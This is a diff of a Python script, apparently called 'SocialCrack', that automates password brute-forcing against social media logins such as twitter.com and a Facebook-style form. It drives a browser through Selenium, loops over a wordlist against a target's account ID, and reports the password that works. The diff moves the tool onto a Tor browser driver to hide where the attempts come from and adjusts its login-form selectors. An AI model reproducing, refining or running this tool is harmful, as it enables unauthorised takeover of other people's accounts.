@@ -19,10 +19,9 @@ class brute_bot(object):
         self.site = site
         self.email_field = email_field
         self.pass_field = pass_field
-        self.threads = threads     
+        self.threads = threads
         self.login_btn = login_btn
-        #self.driver = TorBrowserDriver('/root/tor-browser_en-US')
-        self.driver = webdriver.Firefox()
+        self.driver = TorBrowserDriver()  # Enter here directory if TOR Browser
 
     def bruteforcer(self):
         driver = self.driver
@@ -40,14 +39,15 @@ class brute_bot(object):
                         password_box = driver.find_element_by_name(self.pass_field)
                         password_box.clear()
                         password_box.send_keys(i)
-                        log_site = driver.find_element_by_id(self.login_btn)
+                        log_site = driver.find_element_by_name(self.login_btn)
                         log_site.click()
+                        #pyautogui.press("return")
                         time.sleep(int(sys.argv[3]))
-                        old = i 
-                        print(f"Trying - {i}") 
-                    except NoSuchElementException: 
-                        pass_found = True 
-                        if pass_found == True: 
+                        old = i
+                        print(f"Trying - {i}")
+                    except NoSuchElementException:
+                        pass_found = True
+                        if pass_found == True:
                             print(f'Password is >> {old} ')
                             driver.close()
                             break
@@ -56,7 +56,7 @@ class brute_bot(object):
             time.sleep(2)
             email_box = driver.find_element_by_xpath(f"//input[@name='{self.email_field}']")
             email_box.clear()
-            email_box.send_keys(self.email)  
+            email_box.send_keys(self.email)
 
             while not pass_found:
                 for i in self.password:
@@ -66,13 +66,12 @@ class brute_bot(object):
                         password_box.send_keys(i)
                         log_site = driver.find_element_by_class_name(f'{self.login_btn}')
                         log_site.click()
-                        #pyautogui.press('enter')
                         time.sleep(int(sys.argv[3]))
                         old = i
-                        print(f"Trying - {i}") 
-                    except NoSuchElementException: 
-                        pass_found = True 
-                        if pass_found == True: 
+                        print(f"Trying - {i}")
+                    except NoSuchElementException:
+                        pass_found = True
+                        if pass_found == True:
                             print(f'Password is >> {old} ')
                             driver.close()
                             break
@@ -80,7 +79,7 @@ class brute_bot(object):
         elif sys.argv[1] == "twitter":
             email_box = driver.find_element_by_class_name(f'{self.email_field}')
             email_box.clear()
-            email_box.send_keys(self.email) 
+            email_box.send_keys(self.email)
 
             while not pass_found:
                 for i in self.password:
@@ -90,24 +89,24 @@ class brute_bot(object):
                         password_box.send_keys(i)
                         pyautogui.press('enter')
                         time.sleep(int(sys.argv[3]))
-                        old = i 
-                        print(f"Trying - {i}") 
-                    except NoSuchElementException: 
-                        pass_found = True 
-                        if pass_found == True: 
+                        old = i
+                        print(f"Trying - {i}")
+                    except NoSuchElementException:
+                        pass_found = True
+                        if pass_found == True:
                             print(f'Password is >> {old} ')
                             driver.close()
                             break
 
 banner = """\n\t
 
-   _____            _       _  _____                _    
-  / ____|          (_)     | |/ ____|              | |   
+   _____            _       _  _____                _
+  / ____|          (_)     | |/ ____|              | |
  | (___   ___   ___ _  __ _| | |     _ __ __ _  ___| | __
   \___ \ / _ \ / __| |/ _` | | |    | '__/ _` |/ __| |/ /
-  ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   < 
+  ____) | (_) | (__| | (_| | | |____| | | (_| | (__|   <
  |_____/ \___/ \___|_|\__,_|_|\_____|_|  \__,_|\___|_|\_\\
-                                                         
+
             AUTHOR --> crypt0sploit ( Adrian )
             INSTAGRAM --> _adyadrian_aa
 
@@ -124,7 +123,7 @@ def main_menu():
         print("Waking up BOT...")
         efield = 'email'
         pfield = 'pass'
-        loginbutton = 'loginbutton'
+        loginbutton = 'login'
         email1 = str(input("\nThe ID of the target >> "))
         target = open(sys.argv[2], 'r')
         readpass = target.readlines()
@@ -143,7 +142,7 @@ def main_menu():
         readpass = target.readlines()
         execute = brute_bot(email1, readpass, site, efield, pfield, int(sys.argv[3]), loginbutton)
         execute.bruteforcer()
-    
+
     elif sys.argv[1] == "twitter":
         site = "https://twitter.com/login/"
         print(banner)
@@ -158,7 +157,7 @@ def main_menu():
         execute.bruteforcer()
 
 if __name__ == "__main__":
-    try:    
+    try:
         if len(sys.argv) < 4:
             print(f"""
             {banner}
